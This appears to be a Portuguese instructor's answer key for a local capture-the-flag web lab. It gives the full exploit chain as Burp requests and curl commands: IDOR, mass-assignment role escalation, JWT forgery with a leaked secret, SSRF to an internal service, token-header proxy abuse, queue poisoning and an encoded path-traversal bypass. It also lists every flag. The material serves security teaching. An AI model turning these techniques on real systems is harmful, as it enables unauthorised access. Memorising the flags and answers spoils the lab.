# Lab 04 - SentinelCore - Walkthrough do Instrutor

Gabarito completo para instrutores do **Lab 04 - SentinelCore**.

## Escopo autorizado

```text
http://127.0.0.1:8094
```

Nao use este walkthrough contra qualquer alvo fora do ambiente local autorizado. Somente a aplicacao principal publica porta no host. `internal-admin`, `redis` e `worker` ficam na rede Docker interna e aparecem na cadeia porque a propria aplicacao consegue conversar com eles.

## Como subir o lab

Dentro do repositorio:

```bash
cd ~/ctf-labs/lab-04-sentinelcore
docker compose down --remove-orphans
docker compose up --build
```

Em outro terminal, quando precisar de apoio tecnico:

```bash
BASE=http://127.0.0.1:8094
COOKIE=/tmp/lab04-sentinel.cookies
```

## Credenciais iniciais

```text
intern / intern2026
```

## Como usar este walkthrough

Este walkthrough prioriza navegador, DevTools e Burp. Os comandos `curl` aparecem apenas como validacao alternativa ou apoio tecnico. A resolucao recomendada para aula e conduzir a exploracao manualmente: observar a interface, capturar requests, enviar para Repeater, alterar parametros, comparar respostas e correlacionar pistas.

## Cadeia de exploracao

A cadeia esperada combina varias falhas pequenas. Nenhuma delas entrega o lab inteiro sozinha; o ponto didatico e correlacionar pistas de objetos, roles, artefatos, rede interna e processamento assincrono.

1. Login como `intern`.
2. Reconhecimento pelo dashboard e pelo JavaScript publico.
3. BOLA/IDOR em detalhes de alertas.
4. Mass Assignment para alterar a role para `analyst`.
5. Debug disclosure.
6. Build artifact leak.
7. JWT forgery para admin.
8. Acesso admin.
9. SSRF para `internal-admin`.
10. Proxy com `x-internal-token`.
11. Template context disclosure.
12. Queue poisoning / worker abuse.
13. Leitura de output do worker.
14. Arbitrary file read final.

## 1. Login e reconhecimento inicial

### Manual

1. Abra o navegador em:

```text
http://127.0.0.1:8094
```

2. Observe a tela de login da **Threat Operations Console**. Ela deve exibir a identidade visual de SOC/Incident Response e a credencial inicial do lab.
3. Faca login com:

```text
intern / intern2026
```

4. No dashboard, anote:

- usuario `intern`
- role `viewer`
- card **Fluxo de alertas**
- card **Claims de identidade**
- card **Telemetria do frontend**
- nota operacional informando que nem todo fluxo interno aparece no menu

5. Abra DevTools > Network e recarregue a pagina.
6. Observe as requisicoes para:

- `/dashboard`
- `/static/style.css`
- `/static/js/sentinel.bundle.js`

7. Abra tambem DevTools > Application/Storage e localize o cookie `token`. Ele sera importante para as proximas etapas.

### Burp

Com o navegador configurado para passar pelo Burp, capture o login e a navegacao inicial. Envie requests interessantes para Repeater, principalmente chamadas de API e o acesso ao bundle estatico.

### Validacao alternativa

Use o apendice de validacao rapida se precisar confirmar HTTP 200, cookie de login ou `/api/v2/me` por terminal.

## 2. Inspecao do JavaScript publico

### Manual

1. Clique no link `sentinel.bundle.js` no dashboard ou abra diretamente:

```text
http://127.0.0.1:8094/static/js/sentinel.bundle.js
```

2. Procure o objeto `SentinelCore`.
3. Identifique a superficie exposta pelo bundle:

- `/api/v2/me`
- `/api/v2/alerts`
- `/api/v2/alerts/{id}`
- `/api/v2/me/profile`
- `/api/v2/debug/health`
- `/api/v2/artifacts/build-manifest`
- `/api/v2/integrations/check`
- `/api/v2/integrations/proxy`
- `/api/v2/reports/render`
- `/api/v2/jobs`
- `/api/v2/jobs/output?file={name}`
- `/api/v2/admin/diagnostics/read?file=app.log`

O bundle nao entrega a solucao completa nem segredos completos no primeiro contato, mas entrega superficie, formatos de request, roles minimas e nomes internos suficientes para orientar a investigacao.

### Burp

Envie os endpoints interessantes para Repeater. Organize abas por etapa: `me`, `alerts`, `profile`, `debug`, `artifacts`, `integrations`, `reports`, `jobs` e `diagnostics`.

## 3. BOLA/IDOR em alertas

### Manual

1. No dashboard, clique em `/api/v2/alerts`.
2. Observe que a lista mostra apenas alertas visiveis ao usuario atual. Para o `intern`, os IDs esperados incluem `1001` e `1004`.
3. Compare a lista com a rota de detalhe indicada no JavaScript: `/api/v2/alerts/{id}`.
4. No navegador ou no Burp Repeater, altere o endpoint para:

```text
/api/v2/alerts/1002
```

5. A resposta retorna um alerta de outro owner. A falha e BOLA/IDOR: a listagem filtra por `owner_id`, mas o endpoint de detalhe valida apenas se o objeto existe.

Flag:

```text
flag{bola_alert_cross_tenant}
```

Pista importante:

```text
Old debug health checks referenced auth material as sentinelcore-dev-****.
```

### Validacao alternativa

O apendice contem uma chamada equivalente para confirmar a flag por terminal.

## 4. Mass Assignment para analyst

### Manual com Burp

1. Abra `/api/v2/me` e confirme que a role atual e `viewer`.
2. No Burp Repeater, crie ou repita uma request:

```http
PATCH /api/v2/me/profile HTTP/1.1
Host: 127.0.0.1:8094
Content-Type: application/json
Cookie: token=...
```

3. Primeiro envie um body normal:

```json
{
  "displayName": "Intern Analyst",
  "preferences": {
    "density": "compact"
  }
}
```

4. Em seguida, adicione um campo extra:

```json
{
  "displayName": "Intern Analyst",
  "preferences": {
    "density": "compact"
  },
  "role": "analyst"
}
```

5. A aplicacao aceita `role=analyst` e emite um novo cookie JWT. Isso demonstra Mass Assignment: o backend faz merge de campos controlados pelo cliente e permite alterar uma propriedade sensivel.
6. Teste tambem `role=admin`. O app bloqueia admin direto, o que preserva a cadeia e obriga a proxima etapa com JWT.
7. Atualize o cookie do navegador, se o Burp nao fizer isso automaticamente.
8. Abra `/api/v2/me` novamente e confirme `role: analyst`.

Flag:

```text
flag{mass_assignment_analyst_role}
```

### Validacao alternativa

O apendice contem uma request equivalente com cookie jar para confirmar que o novo cookie foi salvo.

## 5. Debug disclosure

### Manual

1. Com a role `analyst`, abra:

```text
/api/v2/debug/health
```

2. A resposta deve conter status do servico, build, uma pista parcial de segredo e a flag.
3. Se receber 403, repita `/api/v2/me`: provavelmente o cookie ainda e o antigo de `viewer`.

Flag:

```text
flag{debug_secret_fragment_disclosed}
```

Pista:

```text
sentinelcore-dev-****
```

### Burp

Repita a mesma request com o cookie antigo de `viewer` e com o cookie novo de `analyst`. Use isso para demonstrar a diferenca entre autenticacao valida e autorizacao por role.

## 6. Build artifact leak

### Manual

1. Ainda como `analyst`, abra:

```text
/api/v2/artifacts/build-manifest
```

2. Observe que a aplicacao preservou um artefato antigo de build.
3. Identifique no conteudo:

```text
JWT_SECRET=sentinelcore-dev-2026
INTERNAL_ADMIN_TOKEN=internal-admin-token-7f3a9c21
```

4. Explique o impacto: segredos de ambiente e tokens internos nunca deveriam permanecer em artefatos publicados na imagem ou acessiveis pela aplicacao.

Flag:

```text
flag{old_build_manifest_leaked_secrets}
```

## 7. JWT forgery para admin

### Manual/conceitual

1. Copie o cookie `token` atual.
2. Decodifique o JWT em uma ferramenta local/offline, no Burp Decoder ou por um script controlado pelo instrutor.
3. Explique as claims principais:

- `id`
- `username`
- `role`
- `scope`

4. O token usa assinatura simetrica. Como o segredo foi vazado no build artifact, e possivel assinar um token novo com `role=admin`.

Assinar JWT manualmente no navegador nao e pratico. Use este comando auxiliar dentro do container:

```bash
export ADMIN_TOKEN=$(docker exec lab04-sentinel-app node -e "const jwt=require('jsonwebtoken'); console.log(jwt.sign({id:1,username:'intern',role:'admin',scope:['admin:read']}, 'sentinelcore-dev-2026'))")
```

Confira se a variavel contem um JWT real:

```bash
echo "$ADMIN_TOKEN"
```

O valor deve ter tres partes separadas por ponto.

### Usando no Burp

No Repeater, envie:

```http
GET /api/v2/admin/final HTTP/1.1
Host: 127.0.0.1:8094
Authorization: Bearer <ADMIN_TOKEN>
```

Tambem e possivel substituir manualmente o cookie `token` no navegador por um JWT admin valido, mas o header `Authorization: Bearer` costuma ser mais simples para aula.

Flag:

```text
flag{jwt_forged_admin_access}
```

A resposta informa que a flag final esta em disco e requer uma primitiva de leitura.

### Troubleshooting local da etapa

- Se aparecer `"authentication required"`, o token nao foi enviado, esta vazio, expirou ou foi copiado errado.
- Se aparecer 403, o token foi aceito, mas a role nao e `admin`.
- Nao use literalmente `COLE_AQUI_O_TOKEN`.

## 8. SSRF para internal-admin

### Manual com Burp

1. Abra uma aba nova no Repeater.
2. Crie a request:

```http
POST /api/v2/integrations/check HTTP/1.1
Host: 127.0.0.1:8094
Authorization: Bearer <ADMIN_TOKEN>
Content-Type: application/json
```

3. Envie o body:

```json
{
  "url": "http://internal-admin:8081/status"
}
```

4. Explique o comportamento: `localhost` e `127.0.0.1` sao bloqueados, mas o nome de servico Docker `internal-admin` funciona dentro da rede interna.
5. A aplicacao principal faz a requisicao do lado servidor e alcanca um servico que nao esta exposto no host.

Flag:

```text
flag{ssrf_reached_internal_admin}
```

## 9. Proxy com x-internal-token

### Manual com Burp

1. Use o endpoint admin:

```http
POST /api/v2/integrations/proxy HTTP/1.1
Host: 127.0.0.1:8094
Authorization: Bearer <ADMIN_TOKEN>
Content-Type: application/json
```

2. Primeiro consulte usuarios internos:

```json
{
  "url": "http://internal-admin:8081/internal/users",
  "headers": {
    "x-internal-token": "internal-admin-token-7f3a9c21"
  }
}
```

3. Explique a quebra de trust boundary: um cliente externo controla headers que a aplicacao envia para um servico interno.

Flag:

```text
flag{internal_admin_token_accepted}
```

4. Repita para a configuracao interna:

```json
{
  "url": "http://internal-admin:8081/internal/config",
  "headers": {
    "x-internal-token": "internal-admin-token-7f3a9c21"
  }
}
```

Flag:

```text
flag{internal_config_disclosed}
```

A configuracao confirma a fila `sentinel:jobs`, tipos de job e output em `/shared`.

## 10. Template context disclosure

### Manual com Burp

1. Envie:

```http
POST /api/v2/reports/render HTTP/1.1
Host: 127.0.0.1:8094
Authorization: Bearer <ADMIN_TOKEN>
Content-Type: application/json
```

2. Body:

```json
{
  "title": "debug",
  "template": "user={{user.username}} role={{user.role}} secret={{config.jwt_hint}} internal={{config.internal_token_hint}}"
}
```

3. Explique que esta etapa nao e RCE. O problema e disclosure de contexto sensivel disponibilizado ao template.

Flag:

```text
flag{template_context_leaked}
```

## 11. Queue poisoning / worker abuse

### Manual com Burp

1. Envie:

```http
POST /api/v2/jobs HTTP/1.1
Host: 127.0.0.1:8094
Authorization: Bearer <ADMIN_TOKEN>
Content-Type: application/json
```

2. Body:

```json
{
  "type": "token.debug",
  "source": "manual",
  "output": "worker-token.txt"
}
```

3. Explique a arquitetura: a API coloca o job no Redis e um worker interno processa a fila.
4. Aguarde alguns segundos.
5. Abra no navegador ou no Repeater:

```text
/api/v2/jobs/output?file=worker-token.txt
```

Flag:

```text
flag{worker_queue_poisoned}
```

Se o output nao aparecer, veja os logs do worker:

```bash
docker logs lab04-worker
```

## 12. Leitura de output do worker

### Manual

A etapa anterior so fecha porque a aplicacao principal expoe uma leitura dos outputs gerados pelo worker em `/api/v2/jobs/output?file=...`. Isso demonstra como uma fila aparentemente interna vira superficie exploravel quando:

- o usuario consegue criar jobs;
- o worker confia no tipo e nos campos do job;
- os outputs sao gravados em volume compartilhado;
- a API expoe leitura desses outputs.

Como demonstracao adicional em aula, use o tipo `report.export` e compare o output com o `token.debug`. Se quiser mostrar a primitiva insegura `file.read` do worker, deixe claro que ela le arquivos dentro do container do worker, nao do host.

## 13. Arbitrary file read final

### Manual

1. A area admin indicou que a flag final esta em disco. Comece pela leitura normal de log:

```text
/api/v2/admin/diagnostics/read?file=app.log
```

2. Explique que a funcionalidade parece limitada ao diretorio de logs.
3. Teste traversal literal no navegador ou Repeater:

```text
../secrets/final.flag
```

4. A tentativa literal deve ser bloqueada.
5. Explique a falha: o filtro procura `../` antes do decode. Se a barra for codificada, a validacao acontece cedo demais e o path resolvido depois escapa do diretorio esperado.
6. Teste o bypass por encoding:

```text
..%2fsecrets%2ffinal.flag
```

7. Request final:

```text
/api/v2/admin/diagnostics/read?file=..%2fsecrets%2ffinal.flag
```

Flag final:

```text
flag{sentinelcore_full_chain_compromised}
```

Importante para a aula: a leitura acontece dentro do container do lab, nao no host.

## Lista de flags

```text
flag{bola_alert_cross_tenant}
flag{mass_assignment_analyst_role}
flag{debug_secret_fragment_disclosed}
flag{old_build_manifest_leaked_secrets}
flag{jwt_forged_admin_access}
flag{ssrf_reached_internal_admin}
flag{internal_admin_token_accepted}
flag{internal_config_disclosed}
flag{template_context_leaked}
flag{worker_queue_poisoned}
flag{sentinelcore_full_chain_compromised}
```

## Troubleshooting

- Porta ocupada: use `docker ps` para identificar containers ativos e rode `docker compose down` dentro de `lab-04-sentinelcore`.
- Cookie antigo: se `/api/v2/me` continuar com `viewer`, o cookie novo da etapa de Mass Assignment nao foi salvo ou nao foi enviado.
- Role nao mudou: confira se o `PATCH /api/v2/me/profile` foi enviado com `Content-Type: application/json` e se a resposta trouxe novo `Set-Cookie`.
- `authentication required`: token ausente, vazio, expirado, mal copiado ou nao enviado no header/cookie.
- 403 em rota admin: o JWT foi aceito, mas a role ou permissao nao e suficiente.
- Token admin vazio: rode `echo "$ADMIN_TOKEN"` e gere novamente com `docker exec`.
- SSRF falhando: confirme que a URL usa `internal-admin:8081`, nao `localhost`.
- Proxy interno falhando: confirme o header `x-internal-token` com o valor vazado no build artifact.
- Worker nao processou: aguarde alguns segundos e verifique `docker logs lab04-worker`.
- Output errado: confira o nome do arquivo em `/api/v2/jobs/output?file=...`.
- Leitura final 403: use `%2f` em vez de `/` no traversal.
- Leitura final 404: confirme o caminho relativo a partir de `/app/logs`: `..%2fsecrets%2ffinal.flag`.

## Apendice - Validacao rapida com curl

Esta secao e apenas para validacao rapida. A resolucao recomendada do lab e manual com navegador, DevTools e Burp.

```bash
BASE=http://127.0.0.1:8094
COOKIE=/tmp/lab04-sentinel.cookies
rm -f "$COOKIE"
```

Login e identidade:

```bash
curl -i -c "$COOKIE" \
  -d "username=intern" \
  -d "password=intern2026" \
  "$BASE/login"

curl -s -b "$COOKIE" "$BASE/api/v2/me" | jq
```

BOLA/IDOR:

```bash
curl -s -b "$COOKIE" "$BASE/api/v2/alerts" | jq
curl -s -b "$COOKIE" "$BASE/api/v2/alerts/1002" | jq
```

Mass Assignment e role `analyst`:

```bash
curl -i -b "$COOKIE" -c "$COOKIE" \
  -X PATCH "$BASE/api/v2/me/profile" \
  -H "Content-Type: application/json" \
  -d '{"displayName":"Intern Analyst","preferences":{"density":"compact"},"role":"analyst"}'

curl -s -b "$COOKIE" "$BASE/api/v2/me" | jq
```

Debug e artefato:

```bash
curl -s -b "$COOKIE" "$BASE/api/v2/debug/health" | jq
curl -s -b "$COOKIE" "$BASE/api/v2/artifacts/build-manifest" | jq
```

JWT admin:

```bash
export ADMIN_TOKEN=$(docker exec lab04-sentinel-app node -e "const jwt=require('jsonwebtoken'); console.log(jwt.sign({id:1,username:'intern',role:'admin',scope:['admin:read']}, 'sentinelcore-dev-2026'))")
echo "$ADMIN_TOKEN"

curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  http://127.0.0.1:8094/api/v2/admin/final | jq
```

SSRF:

```bash
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://internal-admin:8081/status"}' \
  "$BASE/api/v2/integrations/check" | jq
```

Proxy interno:

```bash
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://internal-admin:8081/internal/users","headers":{"x-internal-token":"internal-admin-token-7f3a9c21"}}' \
  "$BASE/api/v2/integrations/proxy" | jq

curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://internal-admin:8081/internal/config","headers":{"x-internal-token":"internal-admin-token-7f3a9c21"}}' \
  "$BASE/api/v2/integrations/proxy" | jq
```

Template context disclosure:

```bash
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"title":"debug","template":"user={{user.username}} role={{user.role}} secret={{config.jwt_hint}} internal={{config.internal_token_hint}}"}' \
  "$BASE/api/v2/reports/render" | jq
```

Queue/worker:

```bash
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"type":"token.debug","source":"manual","output":"worker-token.txt"}' \
  "$BASE/api/v2/jobs" | jq

sleep 2

curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "$BASE/api/v2/jobs/output?file=worker-token.txt"
```

Leitura normal e flag final:

```bash
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "$BASE/api/v2/admin/diagnostics/read?file=app.log"

curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "$BASE/api/v2/admin/diagnostics/read?file=..%2fsecrets%2ffinal.flag"
```
